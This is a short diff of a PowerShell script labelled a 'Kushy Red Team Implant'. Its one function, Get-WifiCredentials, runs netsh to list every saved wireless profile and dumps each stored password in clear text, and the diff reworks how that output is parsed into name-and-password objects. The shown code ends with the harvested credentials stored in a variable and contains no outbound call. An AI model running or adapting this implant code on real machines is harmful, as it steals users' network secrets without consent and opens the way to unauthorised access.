@@ -1,17 +1,16 @@
 Write-Host "Hello World from Kushy Red Team Implant"
 
 function Get-WifiCredentials {
-    netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {
-        $_ -match ':(.+)$'
-        $profile = $matches[1].Trim()
-        netsh wlan show profile name="$profile" key=clear | Select-String 'Key Content' |
+    (netsh wlan show profiles) -match 'All User Profile' | ForEach-Object {
+        $profile = ($_ -split ': ')[1].Trim()
+        $password = (netsh wlan show profile name="$profile" key=clear) -match 'Key Content' |
             ForEach-Object {
-                $_ -match ':(.+)$'
-                [PSCustomObject]@{
-                    Profile  = $profile
-                    Password = if ($matches[1].Trim()) { $matches[1].Trim() } else { 'N/A' }
-                }
+                ($_ -split ': ')[1].Trim()
             }
+        [PSCustomObject]@{
+            ProfileName = $profile
+            Password    = if ($password) { $password } else { 'N/A' }
+        }
     }
 }
 $credentials = Get-WifiCredentials
